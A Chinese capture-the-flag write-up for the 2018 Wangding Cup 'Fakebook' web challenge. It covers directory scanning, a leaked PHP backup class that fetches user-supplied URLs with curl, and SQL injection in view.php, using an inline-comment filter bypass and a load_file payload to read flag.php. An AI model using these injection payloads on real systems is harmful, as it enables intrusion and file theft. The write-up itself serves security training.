# [网鼎杯 2018]Fakebook

1. 目录扫描

   - robots.txt
   - flag.php

   打开 robots.txt 发现 user.php.bak

![image-20211022111059709](https://i.loli.net/2021/10/22/mClExzbcfnrWNjA.png)

下载 /user.php.bak 得到：

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```



2. 随便添加一个账号

![image-20211020202149740](https://i.loli.net/2021/10/20/kQG9JSLvrKxXwF4.png)



3. 点击用户名跳转

跳转地址：/view.php?no=1

改为：/view.php?no=0

报错如下：

![image-20211020202118864](https://i.loli.net/2021/10/20/mzu7HpvDCJ4wgQO.png)



4. 尝试注入

加单引号报错，爆出网站觉得路径

![image-20211022141423808](https://i.loli.net/2021/10/22/u7HqFTvl56nZxB3.png)



构造闭合

```html
/view.php?no=1 and 1
```



判断读写权限

![image-20211022141142849](https://i.loli.net/2021/10/22/Jamz8ACo1fnRBul.png)



5. 直接读取 flag.php

过滤 `union select`加内联注释绕过 `union/**/select`

```sql
/view.php?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
```

![image-20211022141800290](https://i.loli.net/2021/10/22/oK19eamCkFrILTE.png)



Get Flag！
